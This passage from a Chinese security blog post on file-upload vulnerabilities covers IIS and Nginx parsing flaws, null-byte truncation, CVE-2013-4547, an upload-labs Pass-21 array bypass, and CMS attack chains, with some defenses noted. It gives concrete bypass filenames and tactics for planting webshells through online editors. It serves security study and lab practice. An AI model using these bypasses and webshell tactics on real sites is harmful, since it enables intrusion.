<p><strong>利用：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo.php\n</span><br></pre></td></tr></table></figure>

<p>###xxx.asp;1.jpg</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将上传的 time.asp文件 抓包</span><br><span class="line">    修改后缀成为：time.asp;<span class="number">1</span>.jpg  <span class="comment">//像这样的文件名可以通过白名单，但是却可以被解析为 .asp文件</span></span><br><span class="line"><span class="comment"># 内容：&lt;%=time()%&gt; 作为试验</span></span><br></pre></td></tr></table></figure>
<h3 id="5-1-3-x-asp-time-jpg"><a href="#5-1-3-x-asp-time-jpg" class="headerlink" title="5.1.3 x.asp/time.jpg"></a>5.1.3 x.asp/time.jpg</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">首先创建一个文件夹：例如：<span class="number">1.</span>asp</span><br><span class="line">上传.asp文件：time.jpg  <span class="comment">//内容：&lt;% =time()%&gt; &lt;% =now()%&gt;</span></span><br><span class="line">访问：<span class="number">1.</span>asp/time.jpg  <span class="comment">//将会被当作.asp文件进行解析 </span></span><br></pre></td></tr></table></figure>

<h2 id="5-3-PHP-CGI-解析漏洞"><a href="#5-3-PHP-CGI-解析漏洞" class="headerlink" title="5.3 PHP CGI 解析漏洞"></a>5.3 PHP CGI 解析漏洞</h2><p>条件：IIS 7.0 / 7.5</p>
<p>1.搭建 IIS 服务器           win-2008</p>
<p><img src="https://i.loli.net/2021/06/06/b5tGMwF9gikBqX8.png" alt="image-20210328163229440"></p>
<p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210328163331220.png" alt="image-20210328163331220"></p>
<p>下一步，点击安装</p>
<p><img src="https://i.loli.net/2021/06/06/zBfx3AQkP6esMD9.png" alt="image-20210328164022953"></p>
<p><img src="https://i.loli.net/2021/06/06/h7EyzfdLjrIct2m.png" alt="image-20210328163829923"></p>
<p><img src="https://i.loli.net/2021/06/06/JvkRuY3782MtPoc.png" alt="image-20210328164127331"></p>
<p>2.使 IIS 支持 PHP脚本类型</p>
<p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210328165154004.png" alt="image-20210328165154004"></p>
<p><img src="https://i.loli.net/2021/06/06/phjEqNax3fRtVru.png" alt="image-20210328165448862"></p>
<p>……未完成</p>
<p>最终的效果是：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">phpinfo.png  该图片的内容是 &lt;?<span class="function">php <span class="title">phpinfo</span><span class="params">()</span></span>; ?&gt;</span><br><span class="line">    但是无法直接访问</span><br><span class="line">    而如果 访问</span><br><span class="line">    phpinfo.png/.php  就可以被解析</span><br></pre></td></tr></table></figure>

<p>防御避免只需要：</p>
<p><img src="https://i.loli.net/2021/06/06/QHtjxzlYNgdpio6.png" alt="image-20210328170651358"></p>
<blockquote>
<p>本质上是与 php.ini 中的 <code>cgi.fix_pathinfo</code> 配置选项有关，等于1即有漏洞，等于0则无。</p>
</blockquote>
<h1 id="六、Nginx-解析漏洞"><a href="#六、Nginx-解析漏洞" class="headerlink" title="六、Nginx 解析漏洞"></a>六、Nginx 解析漏洞</h1><h2 id="6-1-Nginx-解析漏洞"><a href="#6-1-Nginx-解析漏洞" class="headerlink" title="6.1 Nginx 解析漏洞"></a>6.1 Nginx 解析漏洞</h2><blockquote>
<p>原理与PHP CGI 解析漏洞相同–与 php.ini 中的 <code>cgi.fix_pathinfo</code> 配置选项有关，等于1即有漏洞，等于0则无。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo.php/.php</span><br></pre></td></tr></table></figure>

<h2 id="6-2-Nginx-空字节漏洞-零零截断"><a href="#6-2-Nginx-空字节漏洞-零零截断" class="headerlink" title="6.2 Nginx 空字节漏洞(零零截断)"></a>6.2 Nginx 空字节漏洞(零零截断)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpinfo.html%<span class="number">00.</span>php</span><br><span class="line">	.php 后缀 使 Nginx 将 phpinfo.html文件 当作 php文件处理</span><br></pre></td></tr></table></figure>

<h2 id="6-3-Nginx-文件名逻辑漏洞-零零截断"><a href="#6-3-Nginx-文件名逻辑漏洞-零零截断" class="headerlink" title="6.3 Nginx 文件名逻辑漏洞(零零截断)"></a>6.3 Nginx 文件名逻辑漏洞(零零截断)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">上传 phpinfo.png空格</span><br><span class="line">访问 phpinfo.png ..php 其中将第一个 . 的十六进制更改为 <span class="number">00</span></span><br></pre></td></tr></table></figure>

<h2 id="6-4-文件名逻辑漏洞-CVE-2013-4547"><a href="#6-4-文件名逻辑漏洞-CVE-2013-4547" class="headerlink" title="6.4 文件名逻辑漏洞 (CVE-2013-4547)"></a>6.4 文件名逻辑漏洞 <strong>(CVE-2013-4547)</strong></h2><p>受影响的nginx版本: 0.8.41至1.4.3和1.5.7之前的1.5.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">正常上传一个附加代码的图片&quot;test.jpg&quot;，访问时后面+&quot;空格&quot;+&quot;\0&quot;+&quot;.php&quot;，即让图片作为php文件解析</span><br></pre></td></tr></table></figure>

<h1 id="七、编辑器上传"><a href="#七、编辑器上传" class="headerlink" title="七、编辑器上传"></a>七、编辑器上传</h1><p>网站的后台编辑网页的在线编辑器，一般都会自动集成文件上传的功能，有些含有文件上传漏洞。</p>
<ul>
<li><p><strong>evebeditor</strong></p>
<p>进入后台可修改 <strong>相关配置</strong> ，比如上传文件的 <strong>白名单</strong>，我们可以添加上我们想上传的脚本类型；或者是在配置当中写入一句话木马，例如将该网页的一些标题更改为我们的一句话木马，等待别人上钩。</p>
</li>
<li><p><strong>fckeditor</strong></p>
<p>后台资源管理器，直接进行上传</p>
<p>技巧：抓包查看时，可以看到其Web服务器，可以利用相关的Web服务器的解析漏洞进行上传，例如：IIS解析漏洞；</p>
<p>如果所访问的服务器进行了防御，当我们成功上传大马之后，当我们进行访问时，它会自动跳转到别的地方，达不到我们想要的效果。</p>
<p>思路：首先上传一个小马，拿到webshell之后，在别的路径之下再上传我们的大马</p>
</li>
</ul>
<h1 id="八、零零截断"><a href="#八、零零截断" class="headerlink" title="八、零零截断"></a>八、零零截断</h1><h2 id="8-1-0x00截断原理"><a href="#8-1-0x00截断原理" class="headerlink" title="8.1 0x00截断原理"></a>8.1 0x00截断原理</h2><p>系统在对文件名的读取时，如果遇到ascii码为零的位置就停止，而这个ascii码为零的位置在16进制中是00，用0x开头表示0x00，就会认为读取已结束，也就是所说的0x00截断。</p>
<h2 id="8-2-URL中的-00"><a href="#8-2-URL中的-00" class="headerlink" title="8.2 URL中的 %00"></a>8.2 URL中的 %00</h2><p>系统是按16进制读取文件，URL中的 <code>%00</code> 是被服务器解码为 <code>0x00</code> 而发挥了截断作用。</p>
<h2 id="8-3-截断利用"><a href="#8-3-截断利用" class="headerlink" title="8.3 截断利用"></a>8.3 截断利用</h2><p><strong>利用条件：php版本小于 5.3.4 且 魔术引号关闭</strong></p>
<p>URL中的 <code>%00</code> 会自动被解码为 <code>0x00</code> ，所以需要时直接输入上 <code>%00</code> ，即可发挥截断作用；<br>以其它方式提交并且需要截断时，需要将其解码为十六进制的相应位置手动更改为 <code>00</code> ，才能发挥截断作用。</p>
<h3 id="GET-方式提交–会自动将-00-解析为-0x00-，发挥截断作用"><a href="#GET-方式提交–会自动将-00-解析为-0x00-，发挥截断作用" class="headerlink" title="GET 方式提交–会自动将 %00 解析为 0x00 ，发挥截断作用"></a>GET 方式提交–会自动将 %00 解析为 0x00 ，发挥截断作用</h3><p><img src="https://i.loli.net/2021/06/06/JTYPFbagqDoEnOQ.png" alt="image-20210323164754637"></p>
<h3 id="POST-方式提交–需要手动将其解码为-十六进制的-00-，发挥截断作用"><a href="#POST-方式提交–需要手动将其解码为-十六进制的-00-，发挥截断作用" class="headerlink" title="POST 方式提交–需要手动将其解码为 十六进制的 00 ，发挥截断作用"></a>POST 方式提交–需要手动将其解码为 十六进制的 00 ，发挥截断作用</h3><p><img src="https://i.loli.net/2021/06/06/ms4VyajKDup3Xxc.png" alt="image-20210323165351925"></p>
<h1 id="九、实战"><a href="#九、实战" class="headerlink" title="九、实战"></a>九、实战</h1><h2 id="9-1-由变量覆盖引起的文件上传漏洞"><a href="#9-1-由变量覆盖引起的文件上传漏洞" class="headerlink" title="9.1 由变量覆盖引起的文件上传漏洞"></a>9.1 由变量覆盖引起的文件上传漏洞</h2><p>metinfov5.0.4</p>
<p>修改变量的值–意味着可修改配置–可覆盖数据库用户名，密码，等待内容，使其连接到自己的服务器上</p>
<p>foreach遍历数组</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$name</span> = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line"><span class="comment">//传参  ?name=bbb</span></span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)&#123;</span><br><span class="line">      <span class="variable">$$key</span> = <span class="variable">$val</span>;   <span class="comment">//将变成 $name = bbb</span></span><br><span class="line">  &#125;</span><br><span class="line">  var_dump(<span class="variable">$name</span>);  <span class="comment">//这样相当于将上面的$name的值通过我们的GET传参进行了修改</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="9-2-常见-CMS-文件上传漏洞"><a href="#9-2-常见-CMS-文件上传漏洞" class="headerlink" title="9.2 常见 CMS 文件上传漏洞"></a>9.2 常见 CMS 文件上传漏洞</h2><p>CMS – 内容管理系统，常被用于 通过使用其上的网站模板二进行二次开发，从而 快速建站</p>
<p>dedeCMS   PHPcms</p>
<p>南方数据管理系统   .asp  access  .mdb文件</p>
<ul>
<li>SQL注入 查询 管理员密码</li>
<li>御剑扫描 后台 进行登录</li>
<li>文件上传 大马，绕过限制，获取路径</li>
<li>通过所上传的图片木马路径进行 数据库备份 将后缀备份成为 .asp</li>
</ul>
<p>防御：</p>
<ul>
<li><p>站库分离</p>
</li>
<li><p>不给 Databackup 执行权限</p>
</li>
<li><p>对 数据库备份功能 的过滤：数据库名称不可更改（后缀强制为.mdb）</p>
<p>所备份的名称 不允许更改后缀</p>
</li>
</ul>
<h2 id="9-3-upload-labs-–-Pass-21"><a href="#9-3-upload-labs-–-Pass-21" class="headerlink" title="9.3 upload-labs  –  Pass-21"></a>9.3 upload-labs  –  Pass-21</h2><h4 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">explode() 函数使用一个字符串分割另一个字符串，并返回由字符串组成的数组</span><br><span class="line">示例：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;www.runoob.com&quot;</span>;</span><br><span class="line">print_r (explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$str</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">运行结果：</span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; www</span><br><span class="line">    [<span class="number">1</span>] =&gt; runoob</span><br><span class="line">    [<span class="number">2</span>] =&gt; com</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">count() 函数返回数组中元素的数目</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = explode(<span class="string">&#x27;.&#x27;</span>, strtolower(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = end(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = reset(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[count(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">分析：</span><br><span class="line"><span class="number">1</span>.首先判断 MIME 类型，必须为 <span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span></span><br><span class="line"><span class="number">2</span>.判断 <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]是否为空，不为空的话，就将 <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>] 赋值给 <span class="variable">$file</span></span><br><span class="line"><span class="number">3</span>.判断 <span class="variable">$file</span> 是否为数组，不是的话，使用 . 将其分割为数组元素</span><br><span class="line"><span class="number">4</span>.判断文件后缀名：取 <span class="variable">$file</span> 数组的最后一个元素 作为 <span class="variable">$ext</span> 的值，判断是否符合白名单</span><br><span class="line"><span class="number">5</span>.符合的话，使用 reset(<span class="variable">$file</span>)函数取 数组 <span class="variable">$file</span>的第一个元素，拼接一个<span class="string">&quot;.&quot;</span>，然后再拼接上 该数组含有元素个数-<span class="number">1</span> 的元素 作为文件名</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210323184828923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">绕过分析：</span><br><span class="line"><span class="number">1</span>.抓包更改 MIME类型--image/jpeg</span><br><span class="line"><span class="number">2</span>.将用户所输入的 <span class="string">&quot;save_name&quot;</span> 更改为一个数组，并赋值：<span class="variable">$save_name</span>[<span class="number">0</span>] = <span class="number">2121</span>.php/；<span class="variable">$save_name</span>[<span class="number">1</span>] = <span class="literal">NULL</span>;<span class="variable">$save_name</span>[<span class="number">2</span>] = jpg</span><br><span class="line"><span class="number">3</span>.则 <span class="variable">$file</span> 本身就成为了一个数组，不会被 . 分割；</span><br><span class="line">reset(<span class="variable">$file</span>) 将会是 <span class="variable">$file</span> 的第一个元素，即 <span class="number">2121</span>.php/；</span><br><span class="line">由于 <span class="variable">$file</span>[<span class="number">1</span>] = <span class="literal">NULL</span>（不可以这么说，因为<span class="literal">NULL</span>不等于空，如果像这样设置<span class="variable">$file</span>[<span class="number">1</span>] = <span class="literal">NULL</span>，count()所计算的个数当中是包含该元素的，这里只是为了便于理解），则count(<span class="variable">$file</span>) 将会是<span class="number">2</span>，所以最终拼接而成的 <span class="variable">$file_name</span> = <span class="number">2121</span>.php/.</span><br></pre></td></tr></table></figure>
<p>因此解析之后会自动忽略掉 <code>/.</code> ，则最终上传的文件名是 <code>2121.php</code></p>
<h2 id="9-4-Weblogic-任意文件上传漏洞（CVE-2018-2894）"><a href="#9-4-Weblogic-任意文件上传漏洞（CVE-2018-2894）" class="headerlink" title="9.4 Weblogic 任意文件上传漏洞（CVE-2018-2894）"></a>9.4 Weblogic 任意文件上传漏洞（CVE-2018-2894）</h2><p><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/weblogic/CVE-2018-2894/">Weblogic 任意文件上传漏洞（CVE-2018-2894）</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line">访问 http://192.168.254.110:7001/console</span><br><span class="line">查看管理员密码  docker-compose logs | grep password</span><br><span class="line">登录进去</span><br></pre></td></tr></table></figure>

<h1 id="十、补充"><a href="#十、补充" class="headerlink" title="十、补充"></a>十、补充</h1><h2 id="10-1-FIFES"><a href="#10-1-FIFES" class="headerlink" title="10.1 $_FIFES"></a>10.1 $_FIFES</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">二、$_FILES</span><br><span class="line">$_FILES数组内容：</span><br><span class="line">$_FILES[<span class="string">&#x27;myFile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] 客户端文件的原名称</span><br><span class="line">$_FILES[<span class="string">&#x27;myFile&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] 文件的 MIME 类型</span><br><span class="line">$_FILES[<span class="string">&#x27;myFile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] 上传文件的大小，单位为字节 </span><br><span class="line">$_FILES[<span class="string">&#x27;myFile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的</span><br><span class="line">$_FILES[<span class="string">&#x27;myFile&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] 该文件上传相关的错误代码</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20191224/1577156449_5e017f6109e6e.png" alt="img"></p>
<h2 id="10-2-截断绕过"><a href="#10-2-截断绕过" class="headerlink" title="10.2 截断绕过"></a>10.2 截断绕过</h2><h3 id="00截断防御"><a href="#00截断防御" class="headerlink" title="00截断防御"></a>00截断防御</h3><ul>
<li>使用 <strong>$_FILES</strong>：由于传入的 <strong>$_FILES[‘name’]</strong> 已经是截断过后的，之后如果使用白名单去判断，显然是不能成功上传的。</li>
</ul>
<p><img src="https://i.loli.net/2021/06/06/1oe8KlkMph5DTJW.png" alt="image-20210326121425141"></p>
<ul>
<li>**isInvalid()**：可用于判断文件名是否合法，即不允许文件名当中含有 <strong>\0</strong>。如果文件名不合法，将抛出异常而退出流程。</li>
</ul>
<h3 id="转换字符集造成截断"><a href="#转换字符集造成截断" class="headerlink" title="转换字符集造成截断"></a>转换字符集造成截断</h3><p>条件：PHP版本 &lt; 5.4</p>
<p><code>iconv() </code>函数可以将一种已知的字符集文件转换成另一种已知的字符集文件。它的作用是在多种国际编码格式之间进行文本内码的转换。</p>

      
    </div>
    <footer class="article-footer">
      
        <div id="donation_div"></div>


<script src="/js/vdonate.js"></script>

<script>
var a = new Donate({
  title: '如果觉得我的文章对您有用，请随意打赏。您的支持将鼓励我继续创作!', // 可选参数，打赏标题
  btnText: 'Donate', // 可选参数，打赏按钮文字
  el: document.getElementById('donation_div'),
  wechatImage: 'https://i.loli.net/2021/07/09/UNXc5a6nbWxgzru.png',
  alipayImage: 'https://i.loli.net/2021/07/09/Sf9nJd8hkOypTar.png'
});
</script>
      
      
      <div>
        <ul class="post-copyright">
          <li class="post-copyright-author">
          <strong>Post author:  </strong>xizhi-future</a>
          </li>
          <li class="post-copyright-link">
          <strong>Post link:  </strong>
          <a href="/2021/06/06/文件上传漏洞/" target="_blank" title="文件上传漏洞">https://xizhi-future.github.io/2021/06/06/文件上传漏洞/</a>
          </li>
          <li class="post-copyright-license">
            <strong>Copyright Notice:   </strong>
            All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
            unless stating additionally.
          </li>
         
        </ul>
<div>

      
      
        
	<div id="comment">
		<!-- 来必力City版安装代码 -->
		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
		<script type="text/javascript">
		   (function(d, s) {
		       var j, e = d.getElementsByTagName(s)[0];

		       if (typeof LivereTower === 'function') { return; }

		       j = d.createElement(s);
		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
		       j.async = true;

		       e.parentNode.insertBefore(j, e);
		   })(document, 'script');
		</script>
		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
		</div>
		<!-- City版安装代码已完成 -->
	</div>



      
      
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a></li></ul>

      

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2021/06/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E3%80%81%E8%AF%BB%E5%8F%96%E3%80%81%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          文件包含、读取、下载漏洞
        
      </div>
    </a>
  
  
    <a href="/2021/06/06/CTF%E4%B9%8BPHP/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">CTF之PHP</div>
    </a>
  
</nav>

  
</article>

<!-- Table of Contents -->

  <aside id="toc-sidebar">
    <div id="toc" class="toc-article">
    <strong class="toc-title">Contents</strong>
    
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">一、文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.1.</span> <span class="nav-text">1.1 条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-WebShell"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 WebShell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-%E5%B0%8F%E9%A9%AC"><span class="nav-number">1.3.</span> <span class="nav-text">1.3 小马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%EF%BC%9A%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80"><span class="nav-number">1.3.1.</span> <span class="nav-text">工具：中国菜刀</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-4-%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%AD%96%E7%95%A5"><span class="nav-number">1.4.</span> <span class="nav-text">1.4 黑白名单策略</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#URLBlacklist%E2%80%93%E9%BB%91%E5%90%8D%E5%8D%95"><span class="nav-number">1.4.1.</span> <span class="nav-text">URLBlacklist–黑名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#URLWhitelist%E2%80%93%E7%99%BD%E5%90%8D%E5%8D%95"><span class="nav-number">1.4.2.</span> <span class="nav-text">URLWhitelist–白名单</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E9%98%B2%E5%BE%A1"><span class="nav-number">2.</span> <span class="nav-text">二、防御</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-%E5%89%8D%E7%AB%AF%E9%99%90%E5%88%B6%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 前端限制与绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A3%80%E6%B5%8B"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 服务器端检测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%91-MIME-%E7%B1%BB%E5%9E%8B"><span class="nav-number">2.2.1.</span> <span class="nav-text">１.MIME 类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="nav-number">2.2.2.</span> <span class="nav-text">2.文件内容</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" 